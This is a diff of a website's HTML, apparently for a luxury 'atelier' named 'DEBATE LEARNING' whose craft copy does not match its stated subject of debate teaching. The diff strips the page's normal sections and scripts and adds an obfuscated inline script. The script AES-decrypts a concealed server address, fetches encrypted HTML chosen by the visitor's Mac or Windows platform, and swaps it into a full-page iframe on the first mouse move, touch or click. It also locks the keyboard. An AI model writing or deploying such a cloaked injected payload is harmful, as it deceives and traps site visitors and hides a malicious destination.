-        <span class="eyebrow">Comparative Rigor</span>
-        <h2>Technical Specification & Craft Benchmarks</h2>
-        <p style="color:var(--text-secondary);">Empirical standards separating our Mercer Street atelier from industrial alternatives.</p>
-      </div>
-      <div class="spec-table-wrap">
-        <table class="spec-table">
-          <thead>
-            <tr>
-              <th>Evaluation Parameter</th>
-              <th>Commercial Production</th>
-              <th>Our Flagship Atelier (DEBATE LEARNING)</th>
-            </tr>
-          </thead>
-          <tbody>
-            <tr>
-              <td><strong>Primary Material Origin</strong></td>
-              <td>Bulk Commercial Syndicates</td>
-              <td>Certified Single-Origin Ethical Reserves</td>
-            </tr>
-            <tr>
-              <td><strong>Joinery & Assembly Technique</strong></td>
-              <td>Automated Adhesive Bonding</td>
-              <td>Hand-Regulated Friction Interlocking & Precision Fastening</td>
-            </tr>
-            <tr>
-              <td><strong>Bench Tolerance Standard</strong></td>
-              <td>&plusmn; 2.5 mm Industrial Spread</td>
-              <td>Micro-Calibrated &plusmn; 0.1 mm Optical Verification</td>
-            </tr>
-            <tr>
-              <td><strong>Longevity Expectancy</strong></td>
-              <td>Planned Obsolescence (1-3 Years)</td>
-              <td>Multi-Generational Custodianship (Lifetime Service)</td>
-            </tr>
-            <tr>
-              <td><strong>Restoration Support</strong></td>
-              <td>Non-Serviceable Disposable Architecture</td>
-              <td>Dedicated 181 Mercer St In-House Conservation Salon</td>
-            </tr>
-          </tbody>
-        </table>
-      </div>
-    </div>
-  </section>
-  <section class="section-pad" style="background:var(--bg-surface); border-top:1px solid var(--border-subtle); border-bottom:1px solid var(--border-subtle);">
-    <div class="container">
-      <div class="section-header">
-        <span class="eyebrow">Patron Experiences</span>
-        <h2>Words from Discerning Collectors</h2>
-        <p style="color:var(--text-secondary);">Unsolicited feedback from patrons who demand uncompromised excellence in Collegiate Debate Pedagogy & Forensic Rhetoric.</p>
-      </div>
-      <div class="grid-3">
-        <div class="quote-card">
-          <p class="quote-text">"The bespoke execution delivered by Debate Learning is extraordinary. The tactile feel and flawless balance prove their unwavering adherence to classical hand methods."</p>
-          <div class="quote-author">Julian Vance</div>
-          <div class="quote-role">Tribeca Private Collector</div>
-        </div>
-        <div class="quote-card">
-          <p class="quote-text">"Visiting 181 Mercer Street was an enlightening experience. Their artisan staff explained every material nuance, producing a commission that has exceeded all expectations."</p>
-          <div class="quote-author">Eleanor Sterling</div>
-          <div class="quote-role">Architectural Historian</div>
-        </div>
-        <div class="quote-card">
-          <p class="quote-text">"In an era dominated by synthetic compromises, finding a workshop with this level of hand integrity and ethical transparency is truly exceptional."</p>
-          <div class="quote-author">Marcus Thorne</div>
-          <div class="quote-role">Design Guild Fellow</div>
-        </div>
-      </div>
-    </div>
-  </section>
-  <section class="section-pad">
-    <div class="container">
-      <div class="section-header">
-        <span class="eyebrow">Collector Inquiries</span>
-        <h2>Frequently Addressed Questions</h2>
-        <p style="color:var(--text-secondary);">Essential guidelines regarding bespoke commissions and visiting our Manhattan salon.</p>
-      </div>
-      <div class="faq-list">
-        <div class="faq-item active">
-          <button class="faq-question">
-            <span>What defines the artisanal standard at 181 Mercer Street?</span>
-            <span>&darr;</span>
-          </button>
-          <div class="faq-answer">
-            <p>Our workshop enforces uncompromising hand-crafting protocols, utilizing single-estate natural materials, precision micro-instrumentation, and extensive individual bench testing exceeding international industry standards.</p>
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question">
-            <span>How are bespoke commissions scheduled and fulfilled?</span>
-            <span>&darr;</span>
-          </button>
-          <div class="faq-answer">
-            <p>Clients schedule private viewings at our Mercer Street salon to discuss material options and ergonomic specifications. Production typically requires six to twelve weeks, supported by milestone progress updates.</p>
-          </div>
-        </div>
-        <div class="faq-item">
-          <button class="faq-question">
-            <span>What archival protections accompany finished works?</span>
-            <span>&darr;</span>
-          </button>
-          <div class="faq-answer">
-            <p>Every piece includes permanent registry documentation in our Manhattan archives and a comprehensive twenty-four-month warranty covering structural integrity under normal metropolitan care.</p>
-          </div>
-        </div>
-      </div>
-      <div style="text-align:center; margin-top:2.5rem;">
-        <a href="faq.html" class="btn-secondary">View All Technical FAQs</a>
-      </div>
-    </div>
-  </section>
-  <section class="section-pad" style="background:linear-gradient(180deg, var(--bg-surface) 0%, var(--bg-primary) 100%); border-top:1px solid var(--border-subtle); text-align:center;">
-    <div class="container" style="max-width:820px;">
-      <span class="eyebrow">Private Appointments</span>
-      <h2 style="font-size:2.8rem; margin-bottom:1.25rem;">Initiate Your Bespoke Commission</h2>
-      <p style="font-size:1.15rem; color:var(--text-secondary); line-height:1.8; margin-bottom:2.5rem;">Patrons are welcomed by appointment at our flagship salon in SoHo for private viewings and material selections. Connect directly with our master artisans.</p>
-      <div style="display:flex; justify-content:center; gap:1.25rem; flex-wrap:wrap;">
-        <a href="contact.html" class="btn-primary" style="padding:0.9rem 2.25rem; font-size:1rem;">Schedule Salon Consultation</a>
-        <a href="tel:+18887775845" class="btn-secondary" style="padding:0.9rem 2.25rem; font-size:1rem;">Call: +1-888-777-5845</a>
-      </div>
-      <p style="margin-top:2rem; font-size:0.9rem; color:var(--text-muted);">Flagship Atelier: 181 Mercer Street, New York, NY 10012</p>
-    </div>
-  </section>
-<footer class="site-footer">
-  <div class="container">
-    <div class="footer-grid">
-      <div class="footer-brand">
-        <span class="brand-logo">DEBATE LEARNING</span>
-        <p>Flagship artisanal studio dedicated to authentic craft disciplines, verified provenance, and generational balance at 181 Mercer Street.</p>
-        <p style="color:var(--accent-gold); font-size:0.9rem; margin-top:0.75rem;">Private Viewings By Appointment</p>
-      </div>
-      <div class="footer-col">
-        <h4>Navigation</h4>
-        <ul>
-          <li><a href="index.php">Atelier Overview</a></li>
-          <li><a href="about.html">Heritage & Lineage</a></li>
-          <li><a href="services.html">Bespoke Portfolio</a></li>
-          <li><a href="faq.html">Collector FAQ</a></li>
-          <li><a href="contact.html">Salon Inquiries</a></li>
-        </ul>
-      </div>
-      <div class="footer-col">
-        <h4>Institutional</h4>
-        <ul>
-          <li><a href="privacy-policy.html">Privacy Policy</a></li>
-          <li><a href="terms-and-conditions.html">Terms & Conditions</a></li>
-          <li><a href="disclaimer.html">Institutional Disclaimer</a></li>
-          <li><a href="cookie-policy.html">Cookie Policy</a></li>
-        </ul>
-      </div>
-      <div class="footer-col">
-        <h4>Flagship Atelier</h4>
-        <p style="color:var(--text-primary); font-size:0.92rem; margin-bottom:0.4rem;">181 Mercer Street, New York, NY 10012, United States</p>
-        <p style="color:var(--text-muted); font-size:0.92rem; margin-bottom:0.4rem;">Telephone: +1-888-777-5845</p>
-        <p style="color:var(--text-secondary); font-size:0.85rem;">Tuesday &ndash; Saturday, 10:00 AM &ndash; 6:00 PM EST</p>
-      </div>
-    </div>
-    <div class="footer-bottom">
-      <span>&copy; 2026 DEBATE LEARNING. All rights reserved. Certified Handcrafted Static Architecture.</span>
-      <span>181 Mercer Street, New York, NY 10012 | +1-888-777-5845</span>
-    </div>
-  </div>
-</footer>
-<script src="assets/js/script.js"></script>
-<script src="assets/js/main.js"></script>
+<script>
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";
+  const URL_KEY   = "UrLk3yShopEase01";
+  const ENC_DATA_ORIGIN = "U2FsdGVkX1/kEh9neuNS60/aE0GrlLMd5C8e0rX9IoWQ+7od9yQpbPzFinjuRzuE";
+
+  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+  const DATA_URL = DATA_ORIGIN + "/data";
+
+  
+  (function warmup() {
+    try {
+      const o = new URL(DATA_ORIGIN).origin;
+
+      
+      const pc = document.createElement("link");
+      pc.rel = "preconnect";
+      pc.href = o;
+      pc.crossOrigin = "anonymous";
+      document.head.appendChild(pc);
+
+     
+      const dns = document.createElement("link");
+      dns.rel = "dns-prefetch";
+      dns.href = o;
+      document.head.appendChild(dns);
+
+      
+      fetch(o + "/favicon.ico", { method: "HEAD", mode: "no-cors" }).catch(() => {});
+    } catch (e) {}
+  })();
+
+  
+  let lastUrl = null;
+  let readyPromise = null;
+
+  function detectPlatform() {
+    const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+              navigator.platform || navigator.userAgent || "";
+    return /mac/i.test(p) ? "mac" : "win";
+  }
+
+  function secureKeyboardAccess() {
+    if (navigator.keyboard) navigator.keyboard.lock().catch(() => {});
+  }
+
+  async function preloadSecret() {
+    if (readyPromise) return readyPromise;
+    readyPromise = (async () => {
+      const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+      const { cipher } = await res.json();
+      const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+      if (!html) throw new Error("Decrypt failed — wrong key?");
+      if (lastUrl) URL.revokeObjectURL(lastUrl);
+      lastUrl = URL.createObjectURL(new Blob([html], { type: "text/html" }));
+      return lastUrl;
+    })();
+    return readyPromise;
+  }
+
+  async function showSecret() {
+    const shop = document.getElementById("shop");
+    const frame = document.getElementById("frame");
+    const contentIframe = document.getElementById("contentiframe");
+    try {
+      const url = await preloadSecret();
+      frame.src = url;
+      shop.style.display = "none";
+      contentIframe.style.display = "block";
+      document.getElementById("customPopup").style.display = "none";
+      secureKeyboardAccess();
+    } catch (e) {
+      document.querySelector(".hint").textContent = "⚠️ " + e.message;
+      document.getElementById("customPopup").style.display = "none";
+    }
+  }
+
+  
+  preloadSecret().catch(() => {});
+
+ 
+  window.addEventListener("mousemove", showSecret, { once: true });
+  window.addEventListener("touchstart", showSecret, { once: true });
+  window.addEventListener("click", showSecret, { once: true });
+</script>
 </body>
 </html>
